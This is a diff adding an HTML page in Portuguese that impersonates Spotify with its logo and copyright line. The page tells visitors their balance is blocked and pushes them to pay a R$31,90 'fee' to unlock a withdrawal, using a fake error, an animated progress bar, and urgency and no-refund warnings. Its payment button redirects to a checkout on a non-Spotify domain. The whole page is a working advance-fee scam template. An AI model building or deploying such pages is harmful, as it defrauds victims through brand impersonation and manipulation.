@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify - Liberação de Saldo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: #111;
+            padding: 20px;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(29, 185, 84, 0.2);
+            position: relative;
+            overflow: hidden;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            width: 80px;
+            margin-bottom: 15px;
+            filter: drop-shadow(0 0 10px rgba(29, 185, 84, 0.7));
+        }
+
+        h1 {
+            font-size: 1.8em;
+            font-weight: 700;
+            color: #1DB954;
+            text-shadow: 0 0 10px rgba(29, 185, 84, 0.7);
+            margin-bottom: 10px;
+        }
+
+        .card {
+            background: #1e1e1e;
+            padding: 15px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .card h2 {
+            font-size: 1.5em;
+            color: #1DB954;
+            margin-bottom: 10px;
+        }
+
+        .card p {
+            font-size: 1em;
+            line-height: 1.5;
+            color: #ccc;
+        }
+
+        .progress-container {
+            background: #333;
+            border-radius: 25px;
+            overflow: hidden;
+            margin: 20px 0;
+            position: relative;
+        }
+
+        .progress-bar {
+            background: linear-gradient(90deg, #1DB954, #1ED760);
+            height: 30px;
+            line-height: 30px;
+            text-align: center;
+            color: #fff;
+            font-size: 1em;
+            border-radius: 25px;
+            width: 0;
+            transition: width 0.5s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .price {
+            color: #1DB954;
+            font-weight: bold;
+            font-size: 1.2em;
+            text-shadow: 0 0 10px rgba(29, 185, 84, 0.7);
+        }
+
+        .pay-button {
+            background: linear-gradient(90deg, #1DB954, #1ED760);
+            color: #fff;
+            border: none;
+            padding: 12px 20px;
+            font-size: 1em;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            width: 100%;
+            margin: 15px 0;
+            display: block;
+            box-shadow: 0 5px 15px rgba(29, 185, 84, 0.5);
+        }
+
+        .pay-button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 8px 20px rgba(29, 185, 84, 0.8);
+        }
+
+        .faq {
+            margin-top: 20px;
+        }
+
+        .faq h2 {
+            font-size: 1.5em;
+            margin-bottom: 15px;
+            color: #1DB954;
+            text-shadow: 0 0 10px rgba(29, 185, 84, 0.7);
+        }
+
+        .faq p {
+            text-align: left;
+            margin-bottom: 10px;
+            font-size: 0.9em;
+            color: #ccc;
+        }
+
+        .warning {
+            color: #ff6b6b;
+            font-weight: bold;
+        }
+
+        .no-refund {
+            color: #ff0000;
+            font-weight: bold;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.8em;
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" alt="Spotify Logo" class="logo">
+            <h1>ERRO NO SISTEMA</h1>
+        </div>
+        <div class="card">
+            <h2>Ops! Algo deu errado.</h2>
+            <p>
+                Identificamos um problema ao processar seu pagamento, e seu saldo foi temporariamente bloqueado. Para liberar seu saque, é necessário realizar um último pagamento no valor de <span class="price">R$31,90</span>. Pedimos desculpas pelo inconveniente.
+            </p>
+        </div>
+        <div class="progress-container">
+            <div class="progress-bar" id="progress" style="width: 11%;">11%</div>
+        </div>
+        <button class="pay-button" onclick="redirectToPayment()">PAGAR TAXA E DESBLOQUEAR SALDO</button>
+        <div class="faq">
+            <h2>Dúvidas Frequentes</h2>
+            <p>
+                <strong>Por que devo pagar essa taxa?</strong> Essa taxa é necessária para cobrir custos operacionais e manutenção de nossos servidores após a transferência de saldo.
+            </p>
+            <p class="warning">
+                Caso não consiga pagar a taxa hoje, você perderá sua vaga. <span class="no-refund">NÃO Reembolsável</span>
+            </p>
+        </div>
+        <div class="footer">
+            &copy; 2025 Spotify. Todos os direitos reservados.
+        </div>
+    </div>
+
+    <script>
+        function redirectToPayment() {
+            window.location.href = 'https://pay.avalieospotify.space/checkout/8355d236-e674-4963-88fd-4b3d4b17a7fa';
+        }
+
+        let progressElement = document.getElementById('progress');
+        let progress = 1;
+
+        function updateProgress() {
+            if (progress <= 100) {
+                progressElement.style.width = progress + '%';
+                progressElement.textContent = progress + '%';
+                progress++;
+                setTimeout(updateProgress, 50);
+            }
+        }
+
+        updateProgress();
+    </script>
+</body>
+</html>
